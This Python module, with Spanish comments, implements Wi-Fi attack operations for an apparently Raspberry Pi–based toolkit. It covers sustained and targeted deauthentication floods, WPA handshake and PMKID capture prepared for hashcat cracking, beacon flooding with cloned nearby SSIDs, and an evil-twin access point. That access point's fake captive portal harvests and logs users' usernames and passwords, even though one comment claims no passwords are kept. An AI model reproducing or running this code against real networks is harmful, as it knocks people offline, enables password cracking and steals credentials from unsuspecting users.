#!/usr/bin/env python3
"""
wifi_ops.py — Modo monitor sobre wlan1 (adaptador dedicado a ataque,
ya unmanaged en NetworkManager). Salida JSON, mismo patron que
wifi_scan.py / db_tool.py.
"""
import sys, os, re, json, subprocess, time, tempfile, glob
import threading, http.server, socketserver, urllib.parse

def _run(cmd, timeout=10):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except Exception:
        return None

def ensure_up(iface):
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])

def get_status(iface):
    r = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'info'])
    if not r or not r.stdout:
        return 'unknown'
    for line in r.stdout.splitlines():
        line = line.strip()
        if line.startswith('type '):
            return line.split('type', 1)[1].strip()
    return 'unknown'

def reset_driver():
    """Reset suave para el adaptador RTL8821CU (driver rtw88_8821cu). A
    diferencia del viejo RTL8188EUS (rtl8xxxu), este driver es estable y
    NO necesita recargar el modulo (evita ~5s de espera y no cuelga en RX).
    Dejamos un reset minimo por si acaso; recargar rtw88 tiene dependencias
    encadenadas (rtw88_core/usb) y es fragil, mejor no tocarlo."""
    pass

def enable_monitor(iface):
    reset_driver()
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'monitor'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    time.sleep(0.5)
    return get_status(iface) == 'monitor'

def disable_monitor(iface):
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'managed'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    time.sleep(0.5)
    return get_status(iface) == 'managed'

def deauth(bssid, channel, count, iface, duration=0, client_mac=None):
    """Deauth en dos modos:
      - rafaga (duration=0): envia `count` rafagas y para. La red se cae
        un momento y se reconecta sola. Rapido.
      - sostenido (duration>0): envia deauth CONTINUO (--deauth 0) durante
        `duration` segundos, manteniendo la red caida todo ese tiempo.
    Si client_mac viene, el deauth es SELECTIVO a ese cliente (-c <mac>):
    desconecta solo ese dispositivo del AP en vez de toda la red."""
    bssid = bssid.upper()  # aireplay-ng compara BSSID como string exacto, siempre en mayusculas
    client = (client_mac or '').strip().upper()
    target = ['-c', client] if client else []   # selectivo vs broadcast
    ok = enable_monitor(iface)
    if not ok:
        return None, f"No se pudo activar modo monitor (estado real: {get_status(iface)})"

    ch_result = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
    if ch_result is None or ch_result.returncode != 0:
        err_detail = (ch_result.stderr.strip() if ch_result else "sin respuesta")
        disable_monitor(iface)
        return None, f"No se pudo fijar canal {channel}: {err_detail}"

    time.sleep(1)
    if duration and int(duration) > 0:
        d = int(duration)
        # Sostenido: --deauth 0 = continuo, cortado por timeout tras `d` segundos
        r = _run(['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
                  '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid] + target + [iface], timeout=d + 5)
    else:
        # Rafaga: enviar `count` rafagas y parar
        r = _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
                  '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid] + target + [iface], timeout=25)
    output = ((r.stdout or '') + (r.stderr or '')) if r else ''

    disable_monitor(iface)
    return output, None

def _station_macs(prefix, bssid):
    """Lee el CSV de airodump (archivos prefix*.csv) y devuelve la lista de
    MAC de estaciones ASOCIADAS a `bssid` (seccion 'Station MAC', 6o campo =
    BSSID). Sin duplicados, en MAYUSCULA."""
    bssid = bssid.upper()
    macs = []
    for csv_path in glob.glob(prefix + "*.csv"):
        try:
            with open(csv_path, "r", errors="replace") as f:
                content = f.read()
        except Exception:
            continue
        idx = content.find("Station MAC")
        if idx == -1:
            continue
        for line in content[idx:].splitlines()[1:]:
            if not line.strip():
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 6:
                continue
            if parts[5].upper() != bssid:   # solo asociados a este AP
                continue
            mac = parts[0].upper()
            if mac and mac not in macs:
                macs.append(mac)
        break
    return macs

def deauth_network(bssid, channel, iface, duration=0, count=10, scan_seconds=8):
    """Deauth EFECTIVO a toda la red. Los clientes modernos ignoran el deauth
    broadcast (a ff:ff:ff:ff:ff:ff); el DIRIGIDO (-c <cliente>) si los tumba.
    Por eso: (1) escucha unos segundos para enumerar las estaciones asociadas
    (airodump, SOLO escucha, sin inyeccion), y (2) lanza un aireplay dirigido
    a CADA cliente EN PARALELO durante `duration` (sostenido) o `count`
    rafagas. Todo en UNA sola sesion de monitor. El escaneo y la inyeccion NO
    corren a la vez (evita el problema de concurrencia airodump+aireplay, ver
    capture_handshake). Si no detecta clientes, cae al broadcast clasico."""
    bssid = bssid.upper()
    ok = enable_monitor(iface)
    if not ok:
        return None, f"No se pudo activar modo monitor (estado real: {get_status(iface)})"

    ch_result = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
    if ch_result is None or ch_result.returncode != 0:
        err_detail = (ch_result.stderr.strip() if ch_result else "sin respuesta")
        disable_monitor(iface)
        return None, f"No se pudo fijar canal {channel}: {err_detail}"
    time.sleep(1)

    # 1) Enumerar estaciones asociadas (solo escucha)
    tmpdir = tempfile.mkdtemp(prefix="piscan_dn_")
    prefix = os.path.join(tmpdir, "scan")
    _run(['sudo', '/usr/bin/timeout', str(scan_seconds),
          '/usr/sbin/airodump-ng', '--bssid', bssid, '-c', str(channel),
          '-w', prefix, '--output-format', 'csv', iface],
         timeout=scan_seconds + 5)
    macs = _station_macs(prefix, bssid)
    try:
        for fpath in glob.glob(prefix + "*"):
            os.remove(fpath)
        os.rmdir(tmpdir)
    except Exception:
        pass

    # 2) Deauth
    d = int(duration) if duration else 0
    n = 0
    if macs:
        if d > 0:
            base = ['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
                    '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid]
            wait_total = d + 10
        else:
            base = ['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
                    '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid]
            wait_total = 30
        # Un aireplay dirigido por cliente, en paralelo. Cada uno se autodetiene
        # por su propio `timeout`, asi que solo esperamos a que terminen.
        procs = []
        for mac in macs:
            try:
                procs.append(subprocess.Popen(base + ['-c', mac, iface],
                                              stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL))
            except Exception:
                pass
        n = len(procs)
        deadline = time.time() + wait_total
        for p in procs:
            try:
                p.wait(timeout=max(1, int(deadline - time.time())))
            except Exception:
                try:
                    p.kill()
                except Exception:
                    pass
    else:
        # Fallback: broadcast clasico (mejor que nada si no vimos clientes)
        if d > 0:
            _run(['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
                  '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid, iface], timeout=d + 5)
        else:
            _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
                  '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid, iface], timeout=25)

    disable_monitor(iface)

    if n:
        modo = f"sostenido {d}s" if d > 0 else "rafaga"
        return f"Deauth dirigido a {n} cliente(s), {modo}.", None
    return ("Sin clientes asociados detectados; se envio deauth broadcast "
            "(puede no tumbar clientes modernos).", None)

def log_attack(attack_type, target_bssid, result, target_ssid=None, target_client_mac=None, details=None):
    """Guarda un ataque/prueba en wifi_attack_log. No debe bloquear el
    flujo si falla (ej. DB no disponible), por eso el try/except silencioso."""
    try:
        sys.path.insert(0, os.path.expanduser("~/piscanlvgl/app"))
        from db.models import get_session, WifiAttackLog
        s = get_session()
        s.add(WifiAttackLog(attack_type=attack_type, target_ssid=target_ssid,
                             target_bssid=target_bssid, target_client_mac=target_client_mac,
                             result=result, details=(details[:500] if details else None)))
        s.commit()
    except Exception:
        pass

def log_honeypot(ssid, clients):
    """Guarda la telemetria de cada dispositivo del honeypot en honeypot_log
    (sin credenciales). No bloquea el flujo si la DB falla."""
    try:
        sys.path.insert(0, os.path.expanduser("~/piscanlvgl/app"))
        from db.models import get_session, HoneypotLog
        s = get_session()
        for c in clients:
            s.add(HoneypotLog(
                ssid=ssid, client_mac=(c.get("mac") or None),
                vendor=(c.get("vendor") or None), client_ip=(c.get("ip") or None),
                hostname=(c.get("hostname") or None), os_guess=(c.get("os") or None),
                user_agent=((c.get("user_agent") or "")[:256] or None),
                requests=c.get("hits", 0),
                portal_user=(c.get("portal_user") or None),
                portal_pass=(c.get("portal_pass") or None),
                domains=(", ".join(c.get("domains", []))[:2000] or None),
                rssi=c.get("rssi"), bytes_rx=c.get("bytes_rx"),
                bytes_tx=c.get("bytes_tx"), dwell_s=c.get("dwell_s"),
                dhcp_vendor=(c.get("dhcp_vendor") or None),
                dhcp_fingerprint=(c.get("dhcp_fingerprint") or None),
                sni_hosts=(", ".join(c.get("sni_hosts", []))[:2000] or None),
                mdns_name=(c.get("mdns_name") or None),
                probe_ssids=(", ".join(c.get("probe_ssids", []))[:1000] or None),
                pcap_path=(c.get("pcap_path") or None)))
        s.commit()
    except Exception:
        pass


def check_handshake(cap_file):
    """Corre aircrack-ng brevemente contra el .cap para ver si detecto
    un handshake completo. Usamos timeout corto porque aircrack-ng se
    queda esperando input interactivo si encuentra varias redes, pero
    el resumen que necesitamos ya se imprime antes de esa espera. El conteo
    debe ser mayor que cero: aircrack tambien imprime "0 handshake"."""
    r = _run(['timeout', '3', 'sudo', '/usr/bin/aircrack-ng', cap_file], timeout=6)
    output = ((r.stdout or '') + (r.stderr or '')) if r else ''
    counts = re.findall(r'\b(\d+)\s+handshakes?\b', output, re.IGNORECASE)
    return any(int(count) > 0 for count in counts), output

def capture_handshake(bssid, channel, iface, capture_seconds=20, deauth_count=5, client_mac=None):
    """Estrategia secuencial (no concurrente): primero deauth completo
    (reset->monitor->ataque->managed, ya probado confiable), despues
    una captura sola con airodump-ng esperando la reconexion del cliente.
    Correr airodump-ng y aireplay-ng al mismo tiempo sobre este driver
    rtl8xxxu resulto en 0 paquetes capturados pese a que cada uno por
    separado funciona bien — evitamos la concurrencia por completo."""
    bssid = bssid.upper()

    deauth_output, deauth_err = deauth(bssid, channel, deauth_count, iface)

    reset_driver()
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'monitor'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
    time.sleep(1)

    ts = int(time.time())
    cap_dir = os.path.expanduser("~/piscanlvgl/data/captures")
    os.makedirs(cap_dir, exist_ok=True)
    prefix = f"{cap_dir}/hs_{bssid.replace(':', '')}_{ts}"
    dump_log_path = f"{prefix}_airodump.log"

    with open(dump_log_path, "w") as dump_log:
        r = _run(['sudo', '/usr/bin/timeout', str(capture_seconds),
                   '/usr/sbin/airodump-ng', '--bssid', bssid, '-c', str(channel),
                   '-w', prefix, '--output-format', 'pcap', iface],
                  timeout=capture_seconds + 5)
        if r:
            dump_log.write((r.stdout or '') + (r.stderr or ''))

    disable_monitor(iface)

    try:
        with open(dump_log_path, "r") as f:
            dump_log_content = f.read()
    except Exception:
        dump_log_content = ""

    cap_file = f"{prefix}-01.cap"
    if not os.path.exists(cap_file):
        return False, None, f"No se genero archivo de captura. Deauth: {deauth_err or 'ok'}. Log airodump:\n{dump_log_content[-500:]}"

    has_hs, aircrack_output = check_handshake(cap_file)
    if not has_hs:
        aircrack_output += f"\n--- deauth: {deauth_err or 'ok'} ---\n--- log airodump (ultimas lineas) ---\n{dump_log_content[-500:]}"
    return has_hs, cap_file, aircrack_output


def pmkid_capture(bssid, channel, iface, seconds=30):
    """Captura PMKID/EAPOL con hcxdumptool 6.3.x y lo convierte a .hc22000
    (formato hashcat) con hcxpcapngtool. El PMKID se obtiene del AP SIN
    necesitar un cliente conectado (a diferencia del handshake).

    hcxdumptool 6.3.x pone el modo monitor EL MISMO (su propio help avisa:
    'Do not set monitor mode by third party tools') y no admite otra
    herramienta sobre la interfaz en paralelo. Por eso aca NO usamos
    enable_monitor: dejamos wlan1 en managed y hcxdumptool la toma. Captura en
    TODOS los canales (-F) unos segundos; despues filtramos el resultado por el
    BSSID objetivo leyendo el .hc22000 (targeting por BPF en 6.3.x es fragil).

    Devuelve (data, err). data trae: pcap, hc22000, hashes (lineas totales),
    pmkid_target/eapol_target (si capturo algo para ESE bssid), detail."""
    bssid = bssid.upper()
    bssid_nc = bssid.replace(":", "")   # sin ':' , como aparece en el .hc22000

    # Estado limpio en managed (NO monitor nuestro); hcxdumptool setea monitor.
    disable_monitor(iface)

    cap_dir = os.path.expanduser("~/piscanlvgl/data/captures")
    os.makedirs(cap_dir, exist_ok=True)
    ts = int(time.time())
    prefix = f"{cap_dir}/pmkid_{bssid_nc}_{ts}"
    pcap = prefix + ".pcapng"
    hc = prefix + ".hc22000"
    logpath = prefix + "_hcxdump.log"

    with open(logpath, "w") as lf:
        r = _run(['sudo', '/usr/bin/timeout', str(seconds),
                  '/usr/bin/hcxdumptool', '-i', iface, '-w', pcap, '-F'],
                 timeout=seconds + 10)
        if r:
            lf.write((r.stdout or '') + (r.stderr or ''))

    # hcxdumptool deja la interfaz en monitor: la devolvemos a managed.
    disable_monitor(iface)

    def _tail(path, n=400):
        try:
            with open(path, "r", errors="replace") as f:
                return f.read()[-n:]
        except Exception:
            return ""

    if not os.path.exists(pcap):
        return None, f"hcxdumptool no genero captura. Log: {_tail(logpath)}"

    # Convertir a hc22000 (no necesita root; lee el pcapng). Es el archivo
    # "serio": se exporta y se crackea en la PC con hashcat (GPU).
    conv = _run(['/usr/bin/hcxpcapngtool', '-o', hc, pcap], timeout=30)
    conv_out = ((conv.stdout or '') + (conv.stderr or '')) if conv else ''

    # Convertir tambien a .cap clasico (pcap) para poder AUDITARLO on-device:
    # aircrack-ng NO lee pcapng, pero si el .cap. Mismo prefijo -> aparece en
    # la lista de capturas / "Auditar" junto a los handshakes. Lectura de
    # archivo, no necesita root.
    cap = prefix + ".cap"
    tcpdump = "/usr/bin/tcpdump" if os.path.exists("/usr/bin/tcpdump") else "/usr/sbin/tcpdump"
    _run([tcpdump, '-r', pcap, '-w', cap], timeout=20)

    # Formato hc22000: WPA*<tipo>*<mic/pmkid>*<MAC_AP>*<MAC_STA>*<ESSID_hex>*...
    # tipo 01 = PMKID, 02 = EAPOL. MAC_AP (4o campo) es hex sin ':'.
    lines = []
    if os.path.exists(hc):
        try:
            with open(hc, "r", errors="replace") as f:
                lines = [l.strip() for l in f if l.strip()]
        except Exception:
            lines = []

    pmkid_target = eapol_target = False
    for l in lines:
        p = l.split("*")
        if len(p) >= 4 and p[3].upper() == bssid_nc:
            if p[1] == "01":
                pmkid_target = True
            elif p[1] == "02":
                eapol_target = True

    data = {
        "pcap": pcap,
        "cap": cap if os.path.exists(cap) else None,
        "hc22000": hc if os.path.exists(hc) else None,
        "hashes": len(lines),
        "pmkid_target": pmkid_target,
        "eapol_target": eapol_target,
        "detail": conv_out[-400:],
    }
    return data, None


def _mdk4_path():
    for p in ("/usr/sbin/mdk4", "/usr/bin/mdk4"):
        if os.path.exists(p):
            return p
    return "/usr/sbin/mdk4"

def _beacon_ssid_file(iface):
    """Arma un archivo de SSIDs 'reales' para el beacon flood, en vez de los
    nombres random de mdk4. Fuentes, en orden:
      1) CLONA el entorno: un scan rapido en managed y toma los SSIDs vistos
         (lo mas creible: floodea copias de las redes reales de alrededor).
      2) Agrega una lista curada del repo (data/beacon_ssids.txt): nombres
         plausibles tipo 'Movistar_Fibra', 'FREE_WiFi', etc.
    Devuelve (ruta_tmp, n_ssids) o (None, 0) si no junto ninguno (mdk4 usa
    random). Se corre ANTES de pasar a monitor (el scan necesita managed)."""
    ssids = []
    try:
        proc = subprocess.run(['sudo', '/usr/sbin/iw', 'dev', iface, 'scan'],
                              capture_output=True, text=True, timeout=15)
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                line = line.strip()
                if line.startswith('SSID:'):
                    s = line.split('SSID:', 1)[1].strip()
                    if s and s not in ssids:
                        ssids.append(s)
    except Exception:
        pass

    curated = os.path.expanduser("~/piscanlvgl/data/beacon_ssids.txt")
    if os.path.exists(curated):
        try:
            with open(curated, errors="replace") as f:
                for line in f:
                    s = line.strip()
                    if s and not s.startswith('#') and s not in ssids:
                        ssids.append(s)
        except Exception:
            pass

    if not ssids:
        return None, 0
    try:
        tmp = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_beacon_',
                                          suffix='.txt', delete=False)
        for s in ssids[:200]:
            tmp.write(s + "\n")
        tmp.close()
        return tmp.name, len(ssids[:200])
    except Exception:
        return None, 0

def beacon_flood(iface, channel=6, seconds=20, pps=80, realistic=True):
    """Beacon flood con mdk4 (modo 'b'): inunda el aire con APs falsos durante
    `seconds` (SOLO laboratorio). Con realistic=True usa nombres CREIBLES
    (clon del entorno + lista curada) via `mdk4 -f <archivo>`, en vez de los
    SSID random. mdk4 necesita la interfaz en MONITOR (no la setea el solo),
    por eso reset->monitor->flood->managed. El ataque es continuo; lo acotamos
    con `timeout` (mdk4 sale por SIGTERM: returncode != 0 es ESPERADO)."""
    ssid_file, n_ssids = (None, 0)
    if realistic:
        disable_monitor(iface)           # managed para poder escanear el entorno
        ssid_file, n_ssids = _beacon_ssid_file(iface)

    ok = enable_monitor(iface)
    if not ok:
        if ssid_file:
            try: os.remove(ssid_file)
            except Exception: pass
        return None, f"No se pudo activar modo monitor (estado: {get_status(iface)})"

    # Canal fijo para que el flood sea visible ahi (mdk4 -c tambien lo fija).
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
    time.sleep(0.5)

    mdk4 = _mdk4_path()
    cmd = ['sudo', '/usr/bin/timeout', str(seconds),
           mdk4, iface, 'b', '-c', str(channel), '-s', str(pps)]
    if ssid_file:
        cmd += ['-f', ssid_file]         # SSIDs del archivo en vez de random
    r = _run(cmd, timeout=seconds + 8)
    out = ((r.stdout or '') + (r.stderr or '')) if r else ''

    disable_monitor(iface)
    if ssid_file:
        try: os.remove(ssid_file)
        except Exception: pass

    return {"seconds": seconds, "channel": channel, "pps": pps,
            "ssids": n_ssids, "realistic": bool(ssid_file),
            "detail": out[-400:]}, None


# ───────────────────── Honeypot de reconocimiento (AP + portal info) ─────────
# SOLO laboratorio / auditoria autorizada. AP ABIERTO con un nombre a eleccion;
# los dispositivos que se conectan quedan registrados para ANALISIS (MAC,
# fabricante, IP, hostname, SO por User-Agent, dominios DNS). NO se piden ni se
# guardan contrasenas: es telemetria para estadistica/reporte. Opcional: puente
# de internet (NAT wlan0->wlan1) para que el cliente navegue y se vea trafico.
_ET_STATE = {"ssid": None, "portal": None}
_HP = {}                      # ip -> telemetria del portal (ua, hosts, hits)
_HP_LOCK = threading.Lock()

def _config_get(key, default=None):
    """Lee un valor de la tabla Config (flags del honeypot)."""
    try:
        sys.path.insert(0, os.path.expanduser("~/piscanlvgl/app"))
        from db.models import get_session, Config
        row = get_session().get(Config, key)
        return row.value if (row and row.value is not None) else default
    except Exception:
        return default

def _hp_get(ip):
    """Devuelve (creando si hace falta) el registro de telemetria de una IP."""
    c = _HP.get(ip)
    if not c:
        c = {"ua": "", "hosts": set(), "hits": 0, "first": time.time(),
             "last": time.time(), "user": "", "pass": ""}
        _HP[ip] = c
    return c

def _hp_record_http(ip, ua, host):
    if not ip:
        return
    with _HP_LOCK:
        c = _hp_get(ip)
        c["hits"] += 1
        c["last"] = time.time()
        if ua and not c["ua"]:
            c["ua"] = ua[:250]
        if host:
            c["hosts"].add(host[:80])

def _hp_record_login(ip, user, pw):
    """Guarda el usuario/clave que el cliente ingresa en el portal de acceso."""
    if not ip:
        return
    with _HP_LOCK:
        c = _hp_get(ip)
        if user:
            c["user"] = user[:64]
        if pw:
            c["pass"] = pw[:64]

def _portal_html(ssid):
    """Carga la plantilla elegida (data/portals/<archivo>) o un portal de acceso
    por defecto con usuario+contrasena. Reemplaza {{SSID}}. Las credenciales que
    ingrese el cliente se guardan (marco: laboratorio autorizado)."""
    name = _ET_STATE.get("portal")
    html = None
    if name:
        path = os.path.join(os.path.expanduser("~/piscanlvgl/data/portals"), name)
        if os.path.exists(path):
            try:
                with open(path, "r", errors="replace") as f:
                    html = f.read()
            except Exception:
                html = None
    if not html:
        html = ("<!doctype html><html><head><meta charset='utf-8'>"
                "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                "<title>{{SSID}}</title></head><body style='font-family:sans-serif;"
                "max-width:420px;margin:44px auto;padding:0 16px;color:#222'>"
                "<h2>Acceso a {{SSID}}</h2>"
                "<p>Inicie sesion para obtener acceso a internet.</p>"
                "<form method='POST' action='/'>"
                "<input name='usuario' placeholder='Usuario' autocomplete='off' "
                "style='width:100%;padding:12px;font-size:16px;box-sizing:border-box;margin-bottom:8px'>"
                "<input name='password' type='password' placeholder='Contrasena' "
                "style='width:100%;padding:12px;font-size:16px;box-sizing:border-box'>"
                "<button type='submit' style='width:100%;padding:12px;font-size:16px;"
                "margin-top:12px'>Conectar</button></form>"
                "<p style='color:#888;font-size:12px;margin-top:24px'>"
                "Prueba de laboratorio.</p></body></html>")
    return html.replace("{{SSID}}", ssid or "WiFi")

class _ETServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass  # no ensuciar stdout (romperia el JSON del contrato)

    def _ip(self):
        return self.client_address[0] if self.client_address else None

    def _send_html(self, html):
        data = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        try:
            self.wfile.write(data)
        except Exception:
            pass

    def do_GET(self):
        host = (self.headers.get("Host", "") or "").split(":")[0].strip()
        _hp_record_http(self._ip(), self.headers.get("User-Agent", ""),
                        self.headers.get("Host", ""))
        # Portal cautivo: los sondeos del SO (connectivitycheck.gstatic.com,
        # captive.apple.com, msftconnecttest.com, etc.) llegan con Host = dominio
        # externo. Les devolvemos 302 -> el portal; el movil lo interpreta como
        # "red con portal" y abre la pagina de login solo. Cuando el navegador
        # cautivo ya entra directo a 10.0.0.1, servimos el HTML del portal.
        if host and host != "10.0.0.1":
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1:8080/")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        self._send_html(_portal_html(_ET_STATE.get("ssid")))

    def do_POST(self):
        ip = self._ip()
        _hp_record_http(ip, self.headers.get("User-Agent", ""),
                        self.headers.get("Host", ""))
        # Captura del login del portal de acceso (usuario + contrasena).
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8", "replace")
            params = urllib.parse.parse_qs(body)
            user = (params.get("usuario") or params.get("user") or [""])[0].strip()
            pw = (params.get("password") or params.get("clave") or [""])[0].strip()
        except Exception:
            user = pw = ""
        _hp_record_login(ip, user, pw)
        # Con puente: autorizar esta IP -> deja de redirigir y se le abre el
        # FORWARD a internet (walled garden). Sin puente es no-op.
        _et_authorize(ip)
        self._send_html(
            "<!doctype html><html><head><meta charset='utf-8'></head>"
            "<body style='font-family:sans-serif;text-align:center;margin-top:60px;color:#222'>"
            "<h3>Conectando...</h3><p>Ya puede navegar.</p></body></html>")

def _first_existing(*paths):
    for p in paths:
        if os.path.exists(p):
            return p
    return None

def _nft():
    return _first_existing("/usr/sbin/nft", "/sbin/nft", "/usr/bin/nft")

def _ipt():
    return _first_existing("/usr/sbin/iptables", "/sbin/iptables", "/usr/bin/iptables")

def _et_redirect_add(iface):
    """Redirige el TCP:80 del cliente -> :8080 (portal no-root). nft (trixie) o
    iptables. Devuelve 'nft'/'iptables'/None."""
    nft = _nft()
    if nft:
        _run(['sudo', nft, 'add', 'table', 'ip', 'piscan_et'])
        _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_et', 'prerouting',
              '{ type nat hook prerouting priority -100 ; }'])
        r = _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_et', 'prerouting',
                  'iifname', iface, 'tcp', 'dport', '80', 'redirect', 'to', ':8080'])
        if r is not None and r.returncode == 0:
            return 'nft'
    ipt = _ipt()
    if ipt:
        r = _run(['sudo', ipt, '-t', 'nat', '-A', 'PREROUTING', '-i', iface,
                  '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '8080'])
        if r is not None and r.returncode == 0:
            return 'iptables'
    return None

def _et_redirect_del(iface):
    nft = _nft()
    if nft:
        _run(['sudo', nft, 'delete', 'table', 'ip', 'piscan_et'])
    ipt = _ipt()
    if ipt:
        _run(['sudo', ipt, '-t', 'nat', '-D', 'PREROUTING', '-i', iface,
              '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '8080'])

def _et_bridge_add(iface, uplink):
    """Puente de internet CON portal cautivo (walled garden): NAT (masquerade)
    de `uplink` (wlan0, con internet) hacia `iface` (wlan1/honeypot) + ip_forward.
    El cliente resuelve DNS real (via dnsmasq), pero MIENTRAS NO este autorizado:
      - su TCP:80 se redirige al portal (:8080) -> el movil abre el portal solo,
      - su FORWARD a internet se bloquea (solo habla con 10.0.0.1).
    Tras el login, `_et_authorize(ip)` mete la IP en el set @authorized: deja de
    redirigir y se le abre internet. Devuelve True si quedo. Solo nft (trixie)."""
    _run(['sudo', '/usr/sbin/sysctl', '-w', 'net.ipv4.ip_forward=1'])
    nft = _nft()
    if nft:
        _run(['sudo', nft, 'add', 'table', 'ip', 'piscan_nat'])
        # Set dinamico de IPs autorizadas (las que ya pasaron por el portal).
        _run(['sudo', nft, 'add', 'set', 'ip', 'piscan_nat', 'authorized',
              '{ type ipv4_addr ; }'])
        # NAT salida a internet SOLO para autorizados: candado principal. Sin
        # login no hay masquerade -> el paquete sale con origen 10.0.0.x (privado)
        # y el router lo descarta = sin internet aunque el forward lo dejara pasar.
        _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'post',
              '{ type nat hook postrouting priority 100 ; }'])
        r = _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'post',
                  'oifname', uplink, 'ip', 'saddr', '@authorized', 'masquerade'])
        # NAT prerouting: autorizados pasan de largo; el resto -> portal :8080.
        _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'pre',
              '{ type nat hook prerouting priority -100 ; }'])
        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'pre', 'iifname', iface,
              'ip', 'saddr', '@authorized', 'tcp', 'dport', '80', 'return'])
        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'pre', 'iifname', iface,
              'tcp', 'dport', '80', 'redirect', 'to', ':8080'])
        # FORWARD (candado secundario): autorizados salen; retorno de conexiones
        # ya establecidas OK; el resto que entra por wlan1 se corta. El portal y
        # el DNS siguen (van a 10.0.0.1 = INPUT, no FORWARD).
        _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'fwd',
              '{ type filter hook forward priority 0 ; }'])
        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'iifname', iface,
              'ip', 'saddr', '@authorized', 'accept'])
        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'oifname', iface,
              'ct', 'state', 'established,related', 'accept'])
        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'iifname', iface, 'drop'])
        return r is not None and r.returncode == 0
    # Fallback iptables: puente plano (internet, SIN portal cautivo forzado).
    ipt = _ipt()
    if ipt:
        r = _run(['sudo', ipt, '-t', 'nat', '-A', 'POSTROUTING', '-o', uplink, '-j', 'MASQUERADE'])
        return r is not None and r.returncode == 0
    return False

def _et_authorize(ip):
    """Marca una IP como autorizada (ya paso por el portal): la saca del redirect
    y le abre el FORWARD a internet. Solo aplica en modo puente (nft)."""
    if not ip or not _ET_STATE.get("bridge"):
        return
    nft = _nft()
    if nft:
        _run(['sudo', nft, 'add', 'element', 'ip', 'piscan_nat', 'authorized',
              '{ %s }' % ip])

def _et_bridge_del(iface, uplink):
    nft = _nft()
    if nft:
        _run(['sudo', nft, 'delete', 'table', 'ip', 'piscan_nat'])
    ipt = _ipt()
    if ipt:
        _run(['sudo', ipt, '-t', 'nat', '-D', 'POSTROUTING', '-o', uplink, '-j', 'MASQUERADE'])
    _run(['sudo', '/usr/sbin/sysctl', '-w', 'net.ipv4.ip_forward=0'])

def _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd, bridge, uplink):
    """Baja todo el honeypot y restaura wlan1 a managed. Best-effort."""
    try:
        if httpd:
            httpd.shutdown()
            httpd.server_close()
    except Exception:
        pass
    _et_redirect_del(iface)
    if bridge:
        _et_bridge_del(iface, uplink)
    for p in procs:
        try:
            p.terminate()
        except Exception:
            pass
    _run(['sudo', '/usr/bin/pkill', '-f', 'hostapd'])
    _run(['sudo', '/usr/bin/pkill', '-f', 'dnsmasq'])
    _run(['sudo', '/usr/bin/pkill', '-f', 'tcpdump'])   # cierra/flushea el pcap
    _run(['sudo', '/usr/bin/ip', 'addr', 'flush', 'dev', iface])
